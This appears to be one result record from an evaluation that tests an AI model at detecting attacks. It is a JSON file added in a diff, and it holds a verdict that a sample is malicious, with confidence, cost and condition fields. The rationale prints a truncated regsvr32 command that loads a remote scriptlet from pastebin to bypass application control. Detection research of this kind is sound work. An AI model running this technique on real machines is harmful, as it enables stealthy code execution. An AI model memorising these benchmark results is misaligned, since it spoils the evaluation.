@@ -1,0 +1,19 @@
+{
+ "flagged": true,
+ "verdict": {
+  "malicious": true,
+  "technique_id": "T1218.010",
+  "confidence": 0.97,
+  "rationale": "A renamed regsvr32.exe (jabber.exe, running from C:\\ProgramData) was executed with /u /s /i:http://pastebin.com/raw/... to load a remote scriptlet, a Squiblydoo-style application control bypass. It then spawned cmd.exe, indicating a likely shell or follow-on execution."
+ },
+ "raw": "{\"malicious\": true, \"technique_id\": \"T1218.010\", \"confidence\": 0.97, \"rationale\": \"A renamed regsvr32.exe (jabber.exe, running from C:\\\\ProgramData) was executed with /u /s /i:http://pastebin.com/raw/... to load a remote scriptlet, a Squiblydoo-style application control bypass. It then spawned cmd.exe, indicating a likely shell or follow-on execution.\"}",
+ "model": "claude-sonnet-5-5",
+ "input_tokens": 2009,
+ "output_tokens": 151,
+ "cost_usd": 0.009542,
+ "attempts": 1,
+ "system": "strong",
+ "condition": "attack_clean_def",
+ "sample": "attack_06",
+ "label": "malicious"
+}
